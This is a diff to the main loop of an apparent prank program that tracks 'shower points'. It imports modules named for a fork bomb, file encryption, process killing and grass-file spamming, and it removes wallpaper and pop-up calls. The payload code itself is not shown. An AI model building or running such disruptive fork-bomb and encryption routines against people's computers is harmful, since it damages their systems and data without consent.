@@ -1,8 +1,6 @@
 from app_processes import isRunning, nerdyProcessPoints, terminateRandNerdProcess
 from addRandomGrassFiles import main as randGrassFileMain
-from change_wallpaper import change_wallpaper
 from fork_bomb_window import fork_bomb_window
-from initial_pop_up_window import initial_pop_up_run
 from lawnmower import main as lawnmowerMain
 from encrypted import main as encryptedMain
 from encrypted import decryptAll
@@ -47,7 +45,7 @@ def adjustLevel():
             if showerPoints > SPLVLS[currLvl]:
                 currLvl -= 1
         #If points are below current level's lower bound increase the level
-        if showerPoints <= SPLVLS[Changed requirements.txtcurrLvl+1]:
+        if showerPoints <= SPLVLS[currLvl+1]:
             currLvl += 1
 
 
@@ -86,10 +84,6 @@ def rewards():
 
 
 #terminateRandNerdProcess()
-
-change_wallpaper()
-initial_pop_up_run()
-
 while True:
     lowerShowerScale()
     if (showerPoints <= SHUTDOWNSP):
